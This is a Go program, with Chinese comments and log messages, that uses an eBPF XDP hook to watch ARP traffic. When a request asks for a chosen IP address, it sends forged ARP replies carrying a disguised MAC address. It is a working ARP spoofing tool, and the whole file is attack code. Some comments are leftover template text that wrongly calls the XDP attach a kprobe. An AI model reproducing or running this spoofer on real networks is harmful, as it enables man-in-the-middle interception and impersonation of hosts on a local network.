package main

import (
	"bytes"
	"encoding/binary"
	"encoding/hex"
	"errors"
	"fmt"
	"log"
	"net"
	"os"
	"os/signal"
	"syscall"
	"time"
	"unsafe"

	"github.com/cilium/ebpf/link"
	"github.com/cilium/ebpf/ringbuf"
	"github.com/cilium/ebpf/rlimit"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

// $BPF_CLANG and $BPF_CFLAGS are set by the Makefile.
//go:generate go run github.com/cilium/ebpf/cmd/bpf2go -cc $BPF_CLANG -cflags $BPF_CFLAGS -type event bpf ringbuffer.c -- -I $BPF_HEADERS

func main() {


	// Subscribe to signals for terminating the program.
	stopper := make(chan os.Signal, 1)
	signal.Notify(stopper, os.Interrupt, syscall.SIGTERM)

	// Allow the current process to lock memory for eBPF resources.
	if err := rlimit.RemoveMemlock(); err != nil {
		log.Fatal(err)
	}

	// Load pre-compiled programs and maps into the kernel.
	objs := bpfObjects{}
	if err := loadBpfObjects(&objs, nil); err != nil {
		log.Fatalf("loading objects: %v", err)
	}
	defer objs.Close()

	// Open a Kprobe at the entry point of the kernel function and attach the
	// pre-compiled program. Each time the kernel function enters, the program
	// will emit an event containing pid and command of the execved task.
	kp, err := link.AttachXDP(link.XDPOptions{
		Program: objs.Arp,
		Interface: 2,
	})
	if err != nil {
		log.Fatalf("opening kprobe: %s", err)
	}
	defer kp.Close()

	// Open a ringbuf reader from userspace RINGBUF map described in the
	// eBPF C program.
	rd, err := ringbuf.NewReader(objs.Events)
	if err != nil {
		log.Fatalf("opening ringbuf reader: %s", err)
	}
	defer rd.Close()

	// Close the reader when the process receives a signal, which will exit
	// the read loop.
	go func() {
		<-stopper

		if err := rd.Close(); err != nil {
			log.Fatalf("closing ringbuf reader: %s", err)
		}
	}()

	log.Println("Waiting for events..")

	arpHandler, err := NewArpHandler(
		"ens33",
		net.ParseIP("192.168.31.9"),
		net.HardwareAddr{0x02, 0x42, 0xac, 0x11, 0x00, 0x07},
	)
	if err != nil {
		panic(err)
	}
	// bpfEvent is generated by bpf2go.
	var event bpfEvent
	for {
		record, err := rd.Read()
		if err != nil {
			if errors.Is(err, ringbuf.ErrClosed) {
				log.Println("Received signal, exiting..")
				return
			}
			log.Printf("reading from reader: %s", err)
			continue
		}

		// Parse the ringbuf event entry into a bpfEvent structure.
		if err := binary.Read(bytes.NewBuffer(record.RawSample), binary.LittleEndian, &event); err != nil {
			log.Printf("parsing ringbuf event: %s", err)
			continue
		}

		data := (*bpfEvent)(unsafe.Pointer(&record.RawSample[0]))
		macStr := hex.EncodeToString(data.Smac[:])
		sip := ResolveIP(data.Sip, true)
		dip := ResolveIP(data.Dip, true)

		if data.Op == 1 {
			if err := arpHandler.CheckIfNeedReply(
				net.IP(sip),
				data.Smac[:],
				net.IP(dip),
			); err != nil {
				fmt.Println("发送欺骗数据失败")
			}

			fmt.Printf("%s(%s)问: 谁是%s?\n",
			sip, macStr, dip,
		)
		}else {
			fmt.Printf("%s回答%s：我是,mac=%s\n",
			sip, dip, macStr,)
		}

	}
}


func ResolveIP(input_ip uint32, isbig bool) net.IP {
	ipNetworkOrder := make([]byte, 4)
	if isbig {
		binary.BigEndian.PutUint32(ipNetworkOrder, input_ip)
	} else {
		binary.LittleEndian.PutUint32(ipNetworkOrder, input_ip)
	}
	return ipNetworkOrder
}



type ArpHandler struct {
	handler      *pcap.Handle
	hookIP       net.IP
	DisguisedMac net.HardwareAddr
}

// 抓到请求hookIP地址的arp请求 把disguisedMac的值伪装成结果响应回去
func NewArpHandler(ifaceName string, hookIP net.IP, disguisedMac net.HardwareAddr) (*ArpHandler, error) {
	h, err := pcap.OpenLive(ifaceName, 1600, true, pcap.BlockForever)
	if err != nil {
		return nil, err
	}
	if err := h.SetBPFFilter("arp"); err != nil {
		return nil, err
	}
	return &ArpHandler{
		handler:      h,
		hookIP:       hookIP,
		DisguisedMac: disguisedMac,
	}, nil
}

func (a *ArpHandler) Close() {
	a.handler.Close()
}


// 检测 是否要进行拦截 和 ARP欺骗
func (a *ArpHandler) CheckIfNeedReply(srcIP net.IP, srcMac net.HardwareAddr, targetIP net.IP) error {
	fmt.Println("开始检查arp请求",a.hookIP.To4().String(),"=>",targetIP.To4().String())
	if targetIP.To4().String() == a.hookIP.To4().String() {
		fmt.Printf("收到来自%s的arp请求，正在构建响应包 \n", srcIP.To4().String())
		err := a.SendReply(srcMac, srcIP)
		if err != nil {
			fmt.Println(err)
		}
		return err
	}
	return nil
}

func (a *ArpHandler) SendReply(toMac net.HardwareAddr, toIp net.IP) error {
	fmt.Println("开始arp欺骗")
	ethernet := &layers.Ethernet{
		SrcMAC:       a.DisguisedMac,
		DstMAC:       toMac,
		EthernetType: layers.EthernetTypeARP,
	}

	arps := &layers.ARP{
		AddrType:          layers.LinkTypeEthernet,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         layers.ARPReply,
		SourceHwAddress:   ethernet.SrcMAC, // 欺诈的mac
		SourceProtAddress: a.hookIP.To4(),
		DstHwAddress:      toMac,
		DstProtAddress:    toIp,
	}

	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}
	err := gopacket.SerializeLayers(buf, opts, ethernet, arps)
	if err != nil {
		return err
	}
	err = a.handler.WritePacketData(buf.Bytes())
	time.Sleep(1 * time.Second)
	return err

}
